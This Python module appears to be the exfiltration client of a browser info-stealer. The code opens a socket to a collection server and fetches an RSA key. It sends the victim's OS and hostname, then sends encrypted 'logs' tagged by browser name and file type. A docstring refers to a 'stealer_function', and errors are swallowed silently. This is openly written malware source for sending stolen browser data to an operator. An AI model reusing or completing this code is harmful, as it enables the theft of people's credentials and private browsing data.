""" IMPORTS """
import sys
import json
import socket
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

from util.general import FORMAT


""" CONSTANTS """
ADDRESS_HOST = 'localhost'
ADDRESS_PORT = 4813

PUBLIC_KEY_LEN = 600
CLIENT_DATA_LEN = 256
CLIENT_BLOCK_LIMIT = 214

socket_info = {
    'client': None,
    'cipher': None,
}


def try_socket(socket_function):
    """ Decorator function which ignores Exceptions when calling stealer_function """
    def wrapper(*args, **kwargs):
        try:
            # Try calling socket_function
            socket_function(*args, **kwargs)
        except AttributeError as e:
            # Ignore errors related to no socket connection when sending
            if e != "'NoneType' object has no attribute 'send'":
                print(e)
        except Exception as e:
            # Ignore any Exceptions
            print(e)

    return wrapper


@try_socket
def socket_initialise() -> None:
    """ Creates socket connection to server """
    # connect to server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ADDRESS_HOST, ADDRESS_PORT))

    # get public key for encryption
    public_key = client.recv(PUBLIC_KEY_LEN)
    public_key = b64decode(public_key)

    # create cipher object from public key
    key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(key)

    # update socket info
    global socket_info
    socket_info = {
        'client': client,
        'cipher': cipher,
    }

    # send client info to server
    socket_send_data({
        'os': sys.platform,
        'computer': socket.gethostname(),
    })


def split_blocks(foo: bytes, block_size: int):
    """ Generator function to split foo into blocks of block_size """
    start_index = 0
    while start_index < len(foo):
        # TODO: padding for AES
        block = foo[start_index: start_index + block_size]
        # padding = b' ' * (block_size - len(block))
        yield block
        start_index += block_size


def socket_send_data(data: dict) -> None:
    """ Send data to socket server """
    # no socket connection
    if not socket_info['client']:
        return

    # encode data
    encoded_data = json.dumps(data).encode(FORMAT)

    # calculate number of blocks representing data
    num_blocks = len(encoded_data) // CLIENT_BLOCK_LIMIT + 1
    print(f'Sending {num_blocks} blocks')

    # send number of blocks to server
    num_blocks = str(num_blocks).encode(FORMAT)
    padding = b' ' * (CLIENT_DATA_LEN - len(num_blocks))
    socket_info['client'].send(num_blocks + padding)

    # split data into blocks
    blocks = split_blocks(encoded_data, CLIENT_BLOCK_LIMIT)
    for block in blocks:
        # encrypt block
        encrypted_block = socket_info['cipher'].encrypt(block)
        padding = b' ' * (CLIENT_DATA_LEN - len(encrypted_block))

        # send block
        socket_info['client'].send(encrypted_block + padding)


@try_socket
def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
    """ Send log to socket server """
    socket_send_data({
        'browser': browser_name,
        'type': file_name,
        'data': data,
    })
